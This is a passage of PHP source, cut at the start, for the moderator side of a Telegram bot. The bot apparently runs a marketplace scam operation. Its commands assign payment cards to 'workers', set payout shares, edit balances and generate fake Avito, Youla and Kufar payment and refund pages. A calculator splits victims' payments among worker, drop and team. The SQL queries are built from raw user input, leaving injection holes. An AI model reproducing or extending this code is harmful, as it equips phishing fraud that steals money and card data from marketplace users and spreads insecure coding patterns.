	
                    }
                }

                if (preg_match('/\/setsupport/i', $message['text']) == TRUE) {
                    if (preg_match('/\/setsupport (\d+|[a-zA-Z0-9@._]+)/i', $message['text']) == TRUE) {
                        if ($message['from'] == '808326111') {
                            if (preg_match('/\/setsupport \d+/i', $message['text']) == TRUE) {
                                $search = mb_substr($message['text'], 12);
                                $query = mysqli_query($connection, "SELECT `username`, `telegram` FROM `accounts` WHERE `telegram` = '$search'");
                            } elseif (preg_match('/\/setsupport [a-zA-Z0-9@._]+/i', $message['text']) == TRUE) {
                                $search = str_replace('@', '', mb_substr($message['text'], 12));
                                $query = mysqli_query($connection, "SELECT `username`, `telegram` FROM `accounts` WHERE `username` LIKE '%$search%'");
                            }

                            if (mysqli_num_rows($query) > 0) {
                                $user = mysqli_fetch_assoc($query);
                                mysqli_query($connection, "UPDATE `accounts` SET `access` = '100' WHERE `telegram` = '$user[telegram]'");

                                $text = "🔑 <b>Модератор</b> <a href=\"tg://user?id=$message[from]\">$message[firstname] $message[lastname]</a> <b>названичил</b> <a href=\"tg://user?id=$user[telegram]\">воркера</a> <b>на пост помощника</b>";
                                send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
			
                                send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                                $text = "🔑 <b>Вы были назначены на должность помощника</b>";
                                send($config['token'], 'sendMessage', Array('chat_id' => $user['telegram'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                            } else {
                                $text = "🔑 <b>Воркер с таким ID не найден</b>";
                                send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
			
                            }
                        } else {
                            $text = "📛 <b>У вас нет доступа к этой команде</b>";
                            send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
		
                        }
                    } else {
                        $text = "❔ Используйте /setsupport <code>[Telegram ID] или [username]</code>";
                        send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
	
                    }
                }

                if (preg_match('/^\/stake/i', $message['text']) == TRUE) {
                    if (preg_match('/^\/stake [0-9]{1,3};[0-9]{1,3}$/i', $message['text']) == TRUE) {
                        $stake = explode(';', mb_substr($message['text'], 7));

                        if ($stake[0] <= 100 AND $stake[1] <= 100) {
                            $curStake = explode(':', $settings['stake']);
                            mysqli_query($connection, "UPDATE `config` SET `stake` = '$stake[0]:$stake[1]'");
                            mysqli_query($connection, "UPDATE `accounts` SET `stake` = '$stake[0]:$stake[1]' WHERE `stake` = '$settings[stake]'");

                            $text = "💯 <b>Модераторы изменили текущую ставку</b>\n\n";
                            $text .= "Оплата — <b>$stake[0]%</b> и вовзрат <b>$stake[1]%</b>";
                            send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['workers'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                            $text = "💯 <b>Модератор</b> <a href=\"tg://user?id=$message[from]\">$message[firstname] $message[lastname]</a> <b>изменил ставку с</b> <code>оплата - $curStake[0]% и вовзрат - $curStake[1]</code> <b>на</b> <code>оплата - $stake[0]% и вовзрат - $stake[1]</code>";
                            send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
		
                            send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                        } else {
                            $text = "❗💯 Ставка не может быть больше 100%";
                            send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
		
                        }
                    } else {
                        $text = "❔ Используйте /stake <code>[Оплата];[Возврат]</code>";
                        send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
	
                    }
                }

                if (preg_match('/^\/setstake/i', $message['text']) == TRUE) {
                    if (preg_match('/^\/setstake (\d+|@{0,1}[\w.]+);[0-9]{1,3};[0-9]{1,3}$/i', $message['text']) == TRUE) {
                        $settings = explode(';', mb_substr($message['text'], 10));

                        if (preg_match('/\d+/i', $settings[0]) == TRUE) {
                            $search = $settings[0];
                            $query = mysqli_query($connection, "SELECT `id`, `stake`, `telegram` FROM `accounts` WHERE `telegram` = '$search'");
                        } elseif (preg_match('/(@{0,1}[\w.]+)/i', $settings[0]) == TRUE) {
                            $search = str_replace('@', '', $settings[0]);
                            $query = mysqli_query($connection, "SELECT `id`, `stake`, `telegram` FROM `accounts` WHERE `username` LIKE '%$search%'");
                        }

                        if (mysqli_num_rows($query) > 0) {
                            $stake = "$settings[1]:$settings[2]";
                            $stake = explode(':', $stake);

                            if ($stake[0] <= 100 AND $stake[1] <= 100) {
                                $user = mysqli_fetch_assoc($query);
                                mysqli_query($connection, "UPDATE `accounts` SET `stake` = '$stake[0]:$stake[1]' WHERE `telegram` = '$user[telegram]'");

                                $curStake = explode(':', $user['stake']);

                                $text = "🌀 <b>Модератор изменил вам ставку с</b> <code>оплата - $curStake[0]% и возврат - $curStake[1]%</code> <b>на</b> <code>оплата - $stake[0]% и возврат - $stake[1]%</code>";
                                send($config['token'], 'sendMessage', Array('chat_id' => $user['telegram'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                                $text = "💵 <b>Модератор</b> <a href=\"tg://user?id=$message[from]\">$message[firstname] $message[lastname]</a> <b>изменил ставку</b> <a href=\"tg://user?id=$settings[0]\">воркеру</a> <b>с</b> <code>оплата - $curStake[0]% и возврат - $curStake[1]%</code> <b>на</b> <code>оплата - $stake[0]% и возврат - $stake[1]%</code>";
                                send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
			
                                send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                            } else {
                                $text = "💵 Ставка не может быть меньше <code>0%</code> и больше <code>100%</code>";
                                send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
			
                            }
                        } else {
                            $text = "🌀 <b>Воркер с таким ID не найден</b>";
                            send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
		
                        }
                    } else {
                        $text = "❔ Используйте /setstake <code>[Telegram ID];[Оплата];[Возврат]</code>";
                        send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
	
                    }
                }

                if (preg_match('/\/setcard/i', $message['text']) == TRUE) {
                    if (preg_match('/\/setcard \d+;(\d{16}|\d{4}\s\d{4}\s\d{4}\s\d{4}|0)/i', $message['text']) == TRUE) {
                        $settings = explode(';', mb_substr($message['text'], 9));
                        $settings[1] = str_replace(' ', '', $settings[1]);

                        $query = mysqli_query($connection, "SELECT `id` FROM `accounts` WHERE `telegram` = '$settings[0]' AND `access` > '0'");

                        if (mysqli_num_rows($query) > 0) {
                            $cards = mysqli_query($connection, "SELECT `id` FROM `cards` WHERE `number` = '$settings[1]' AND `status` = '1'");
                            if ($settings[1] == 0) {
                                mysqli_query($connection, "UPDATE `accounts` SET `card` = '0' WHERE `telegram` = '$settings[0]'");
                                $text = "🔑 <b>Модератор</b> <a href=\"tg://user?id=$message[from]\">$message[firstname] $message[lastname]</a> <b>удалил карту воркеру</b>\n\n";
                                $text .= "<b>Telegram ID:</b> <a href=\"tg://user?id=$settings[0]\">$settings[0]</a>\n";
                                send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
			
                                $text = "💳 <b>Модератор открепил от вас карту — приём платежей не работает</b>";
                                send($config['token'], 'sendMessage', Array('chat_id' => $settings[0], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                                $text = "🔑 <b>Модератор</b> <a href=\"tg://user?id=$message[from]\">$message[firstname] $message[lastname]</a> <b>удалил карту</b> <a href=\"tg://user?id=$settings[0]\">воркеру</a>";
                                send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                            } else {
                                if (mysqli_num_rows($cards) > 0) {
                                    mysqli_query($connection, "UPDATE `accounts` SET `card` = '$settings[1]' WHERE `telegram` = '$settings[0]'");
                                    $text = "🔑 <b>Модератор</b> <a href=\"tg://user?id=$message[from]\">$message[firstname] $message[lastname]</a> <b>установил карту воркеру</b>\n\n";
                                    $text .= "<b>Telegram ID:</b> <a href=\"tg://user?id=$settings[0]\">$settings[0]</a>\n";
                                    $text .= "<b>Номер карты:</b> <code>" . chunk_split($settings[1], 4, ' ') . "</code>\n";
                                    send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
				
                                    $text = "💳 <b>Модератор закрепил за вами карту — можете воркать</b>";
                                    send($config['token'], 'sendMessage', Array('chat_id' => $settings[0], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                                    $text = "🔑 <b>Модератор</b> <a href=\"tg://user?id=$message[from]\">$message[firstname] $message[lastname]</a> <b>установил карту </b> <a href=\"tg://user?id=$settings[0]\">воркеру</a>";
                                    send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                                } else {
                                    $text = "🔑 <b>Карта не найдена или является неактивной</b>";
                                    send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
				
                                }
                            }
                        } else {
                            $text = "🔑 <b>Воркер с таким ID не найден или заблокирован</b>";
                            send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
		
                        }
                    } else {
                        $text = "❔ Используйте /setcard <code>[Telegram ID];[Номер карты]</code>";
                        send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
	
                    }
                }


                if (preg_match('/\/info/i', $message['text']) == TRUE) {
                    if (preg_match('/\/info (\d+|@{0,1}[\w.]+)/i', $message['text']) == TRUE) {
                        if (preg_match('/\/info \d+/i', $message['text']) == TRUE) {
                            $search = mb_substr($message['text'], 6);
                            $query = mysqli_query($connection, "SELECT `username`, `telegram`, `stake`, `card`, `balance`, `access`, `inviter`, `warns`, `created` FROM `accounts` WHERE `telegram` = '$search'");
                        } elseif (preg_match('/\/info @{0,1}[\w.]+/i', $message['text']) == TRUE) {
                            $search = str_replace('@', '', mb_substr($message['text'], 6));
                            $query = mysqli_query($connection, "SELECT `username`, `telegram`, `stake`, `card`, `balance`, `access`, `inviter`, `warns`, `created` FROM `accounts` WHERE `username` LIKE '%$search%'");
                        }

                        if (mysqli_num_rows($query) > 0) {
                            $user = mysqli_fetch_assoc($query);

                            send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => getMyProfile($user['telegram'], 1), 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => getMyProfile($user['telegram'], 1, 1)));
                        } else {
                            $text = "🥺 <b>Воркера с таким ником или ID не найдено</b> $search";
                            send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
		
                        }
                    } else {
                        $text = "❔ Используйте /info <code>Telegram ID или никнейм воркера</code>";
                        send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
	
                    }
                }

                if (preg_match('/\/minprice/i', $message['text']) == TRUE) {
                    if (preg_match('/^\/minprice \d+$/i', $message['text']) == TRUE) {
                        $price = mb_substr($message['text'], 10);

                        mysqli_query($connection, "UPDATE `config` SET `min_price` = '$price'");
                        $text = "💸 <b>Модератор</b> <a href=\"tg://user?id=$message[from]\">$message[firstname] $message[lastname]</a> <b>изменил минимальную сумму объявления с</b> <code>$settings[min_price] руб.</code> <b>на</b> <code>$price руб.</code>";
                        send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
	
                        send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                    } else {
                        $text = "❔ Используйте /minprice <code>[Минимальная сумма объявления]</code>";
                        send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
	
                    }
                }

                if (preg_match('/\/maxprice/i', $message['text']) == TRUE) {
                    if (preg_match('/^\/maxprice \d+$/i', $message['text']) == TRUE) {
                        $price = mb_substr($message['text'], 10);

                        mysqli_query($connection, "UPDATE `config` SET `max_price` = '$price'");
                        $text = "💸 <b>Модератор</b> <a href=\"tg://user?id=$message[from]\">$message[firstname] $message[lastname]</a> <b>изменил максимальную сумму объявления с</b> <code>$settings[max_price] руб.</code> <b>на</b> <code>$price руб.</code>";
                        send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
	
                        send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                    } else {
                        $text = "❔ Используйте /maxprice <code>[Максимальная сумма объявления]</code>";
                        send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
	
                    }
                }

                if (preg_match('/\/msg/i', $message['text']) == TRUE) {
                    if (preg_match('/^\/msg (|-)[0-9]+;.+/i', $message['text']) == TRUE) {
                        $msg = explode(';', mb_substr($message['text'], 5));

                        $text = "✉️ <b>Сообщение от модератора:</b>\n\n";
                        $text .= str_replace('\\n', '\n', $msg[1]);
                        $send = send($config['token'], 'sendMessage', Array('chat_id' => $msg[0], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));

                        if ($send->ok) {
                            $text = "📨 <b>Ваше сообщение было доставлено воркеру</b>";
                            send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
		
                            $text = "<b>Модератор</b> <a href=\"tg://user?id=$message[from]\">$message[firstname] $message[lastname]</a> <b>отправил сообщение</b> <a href=\"tg://user?id=$msg[0]\">воркеру</a>\n\n";
                            $text .= "<b>Текст сообщения:</b> <i>$msg[1]</i>";
                            send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                        } else {
                            $text = "📭 <b>Сообщение не удалось доставить</b>";
                            send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
		
                        }
                    } else {
                        $text = "❔ Используйте /msg <code>[ID воркера];[Текст сообщения]</code>";
                        send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
	
                    }
                }

                if (preg_match('/\/setbalance/i', $message['text']) == TRUE) {
                    if (preg_match('/\/setbalance \d+;\d+/i', $message['text']) == TRUE) {
                        $balance = explode(';', mb_substr($message['text'], 12));

                        $query = mysqli_query($connection, "SELECT `telegram`, `balance` FROM `accounts` WHERE `telegram` = '$balance[0]'");

                        if (mysqli_num_rows($query) > 0) {
                            $user = mysqli_fetch_assoc($query);
                            mysqli_query($connection, "UPDATE `accounts` SET `balance` = '$balance[1]' WHERE `telegram` = '$user[telegram]'");
                            $text = "💵 <b>Модератор</b> <a href=\"tg://user?id=$message[from]\">$message[firstname] $message[lastname]</a> <b>изменил баланс</b> <a href=\"tg://user?id=$user[telegram]\">воркеру</a> <b>с</b> <code>$user[balance] руб.</code> <b>на</b> <code>$balance[1] руб.</code>";
                            send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
		
                            send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                            $text = "💵 <b>Модератор обновил вам баланс с</b> <code>$user[balance] руб.</code> <b>на</b> <code>$balance[1] руб.</code>";
                            send($config['token'], 'sendMessage', Array('chat_id' => $user['telegram'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                        } else {
                            $text = "😕 <b>Воркер с таким ID не был найден</b>";
                            send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
		
                        }
                    } else {
                        $text = "❔ Используйте /setbalance <code>[ID воркера];[Сумма]</code>";
                        send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
	
                    }
                }

                if (preg_match('/\/create/i', $message['text']) == TRUE) {
                    if (preg_match('/\/create \d+;(.{24}|\d{5,64});.+;\d{2,5}(;.+|)/i', $message['text']) == TRUE) {
                        $advert = explode(';', mb_substr($message['text'], 8));

                        if (empty($advert[4])) $advert[4] = '';

                        if (preg_match('/^[0-9]+$/', $edit[1]) == TRUE) {
                            $type = '0';
                        } elseif (preg_match('/[a-z0-9]{24}/i', $edit[1]) == TRUE) {
                            $type = '1';
                        } else {
                            $type = '0';
                        }

                        $query = mysqli_query($connection, "SELECT * FROM `adverts` WHERE `advert_id` = '$advert[1]'");
                        if (mysqli_num_rows($query) > 0) {
                            mysqli_query($connection, "UPDATE `adverts` SET `advert_id` = '$advert[1]', `worker` = '$advert[0]', `title` = '$advert[2]', `image` = '$advert[4]', `price` = '$advert[3]' WHERE `advert_id` = '$advert[1]'");
                        } else {
                            mysqli_query($connection, "INSERT INTO `adverts` (`type`, `advert_id`, `worker`, `title`, `image`, `price`, `status`, `time`) VALUES ('$type', '$advert[1]', '$advert[0]', '$advert[2]', '$advert[4]', '$advert[3]', '1', '" . time() . "')");
                        }

                        $adverts = mysqli_fetch_assoc($query);

                        $text = "⚙️ <b>Модератор</b> <a href=\"tg://user?id=$message[from]\">$message[firstname] $message[lastname]</a> <b>сгенерировал объявление для</b> <a href=\"tg://user?id=$advert[0]\">$advert[0]</a>\n\n";
                        $text .= "<b>ID объявления:</b> <a href=\"https://www.avito.ru/$advert[1]\">$advert[1]</a>\n";
                        $text .= "<b>Название товара:</b> <code>$advert[2]</code>\n";
                        $text .= "<b>Сумма (без доставки):</b> <code>$advert[3] руб.</code>\n";
                        send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
	
                        $text = "⚙️ <b>Модератор сгенерировал объявление для вас</b>\n\n";

                        if ($adverts['type'] == 0) {
                            $text .= "<b>Оплата:</b> https://$domains[onliner]/buy?id=$advert[1]\n";
                            $text .= "<b>Возврат:</b> https://$domains[onliner]/refund?id=$advert[1]";
                        } elseif ($advert['type'] == 1) {
                            $text .= "<b>Оплата:</b> https://$domains[youla]/product/$advert[1]/buy/delivery\n";
                            $text .= "<b>Возврат:</b> https://$domains[youla]/refund/$advert[1]/\n";
                        } elseif ($adverts['type'] == 2) {
                            $text .= "<b>Оплата:</b> https://$domains[kufar]/buy?id=$advert[1]\n";
                            $text .= "<b>Возврат:</b> https://pay.$domains[kufar]/refund.php?id=$advert[1]";
                        }

                        send($config['token'], 'sendMessage', Array('chat_id' => $advert[0], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                        $text = "⚙️ <b>Модератор</b> <a href=\"tg://user?id=$message[from]\">$message[firstname] $message[lastname]</a> <b>сгенерировал объявление для</b> <a href=\"tg://user?id=$advert[0]\">$advert[0]</a>";
                        send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
                    } else {
                        $text = "❔ Используйте /create <code>[ID воркера];[ID объявления];[Название товара];[Сумма товара]</code>";
                        send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
	
                    }
                }

                if (preg_match('/\/checkip/i', $message['text']) == TRUE) {
                    if (preg_match('/\/checkip (\d{1,3}|[.])+/i', $message['text']) == TRUE) {
                        $ip = mb_substr($message['text'], 9);

                        $ipapi = json_decode(file_get_contents("http://ip-api.com/json/$ip"));

                        if ($ipapi->{'status'} == 'success') {
                            $text = "ℹ️ <b>Информация об IP адресе</b> <code>$ip</code>\n\n";
                            $text .= "Страна: <code>" . getCountryFlag($ipapi->{'countryCode'}) . " " . $ipapi->{'country'} . "</code>\n";
                            $text .= "Регион: <code>" . $ipapi->{'regionName'} . "</code>\n";
                            $text .= "Город: <code>" . $ipapi->{'city'} . "</code>\n";
                            $text .= "Временная зона: <code>" . $ipapi->{'timezone'} . "</code>\n";
                            $text .= "Провайдер: <code>" . $ipapi->{'isp'} . "</code>\n\n";
                            $text .= "<a href=\"https://www.google.com/maps/@" . $ipapi->{'lat'} . "," . $ipapi->{'lon'} . ",14z\">Посмотреть на Google карте</a>";
                        } else {
                            $text = "🔎 <b>Информация об IP адресе не найдена</b>";
                        }

                        send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
	
                    } else {
                        $text = "❔ Используйте /checkip <code>[IP адрес]</code>";
                        send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
	
                    }
                }

                if (preg_match('/\/calculate/i', $message['text']) == TRUE) {
                    if (preg_match('/\/calculate \d{3,5}/i', $message['text']) == TRUE) {
                        $amount = mb_substr($message['text'], 11);

                        if ($amount >= 100 AND $amount <= 5000) {
                            $amount = floor($amount);
                            $payout = floor($amount/100*65);
                            $drop = floor($amount/100*5);
                            $profit = floor(($amount) - ($payout - $drop));

                            $file = simplexml_load_file("http://www.cbr.ru/scripts/XML_daily.asp?date_req=".date("d/m/Y"));

                            $xml = $file->xpath("//Valute[@ID='R01090B']");
                            $valute = $xml[0]->Value;
                            echo $valute;


                            $text = "🧮 <b>Калькулятор выплаты</b>\n\n";
                            $text .= "<b>Сумма залёта:</b> <code>$amount бр. (~". $amount * $valute ." руб.)</code>\n";
                            $text .= "<b>Доля воркера:</b> <code>$payout бр. (~". $payout * $valute ." руб.)</code>\n";
                            $text .= "<b>Доля дропа:</b> <code>$drop бр. (~". $drop * $valute ." руб.)</code>\n";
                            $text .= "<b>Доля команды:</b> <code>$profit бр. (~". $profit * $valute ." руб.)</code>\n";

                            send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
		
                        } else {
                            $text = "🧮 Минимальная сумма <code>100 руб.</code> и максимальная сумма <code>5000 руб.</code>";
                            send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
		
                        }
                    } else {
                        $text = "❔ Используйте /calculate <code>[Сумма]</code>";
                        send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
	
                    }
                }
            }
        }
    }

}
?>